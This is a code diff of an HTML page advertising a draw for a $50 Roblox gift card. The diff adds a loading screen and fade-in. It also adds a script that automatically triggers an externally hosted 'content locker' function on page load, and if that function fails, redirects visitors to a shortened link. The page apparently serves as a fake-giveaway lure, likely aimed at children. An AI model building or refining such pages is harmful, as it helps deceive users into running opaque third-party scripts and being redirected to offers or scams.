@@ -21,6 +21,7 @@
       font-family: 'Fira Sans', sans-serif;
       background-color: #020000;
       color: #fff;
+      overflow-x: hidden;
     }
 
     .container {
@@ -28,6 +29,12 @@
       margin: auto;
       padding: 40px 20px;
       text-align: center;
+      opacity: 0;
+      transition: opacity 1s ease-in-out;
+    }
+
+    .container.visible {
+      opacity: 1;
     }
 
     .container img {
@@ -45,10 +52,31 @@
       font-size: 18px;
       margin-bottom: 30px;
     }
+
+    /* Loader */
+    #loader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #020000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      color: #7747FF;
+      font-size: 24px;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
+  <!-- Loader -->
+  <div id="loader">Loading...</div>
+
+  <!-- Main Content -->
+  <div class="container" id="mainContent">
     <img src="https://d15k2d11r6t6rl.cloudfront.net/pub/bfra/ge6dnk7k/ed4/rw2/37e/1691173864951.png" alt="Roblox Gift Card">
     <h1>Enter for a Chance to Win a $50 Gift Card for Roblox</h1>
     <p>Be the first to participate in the draw to increase your chances of winning.</p>
@@ -60,11 +88,26 @@
   </script>
   <script src="https://dfmpe7igjx4jo.cloudfront.net/708c645.js"></script>
 
-  <!-- فتح الكونتنت لوكر أوتوماتيكياً -->
+  <!-- فتح الكونتنت لوكر أوتوماتيكياً مع loader و fallback -->
   <script>
     window.onload = function() {
+      const main = document.getElementById("mainContent");
+      const loader = document.getElementById("loader");
+
+      // عرض الصفحة تدريجياً
+      setTimeout(() => {
+        loader.style.display = "none";
+        main.classList.add("visible");
+      }, 800); // مدة العرض قبل fade-in
+
+      // فتح الكونتنت لوكر
       if (typeof _gu === "function") {
         _gu();
+      } else {
+        // fallback: إذا الكونتنت لوكر ما خدمش
+        setTimeout(() => {
+          window.location.href = "https://smrturl.co/ccfa87d";
+        }, 1500);
       }
     };
   </script>
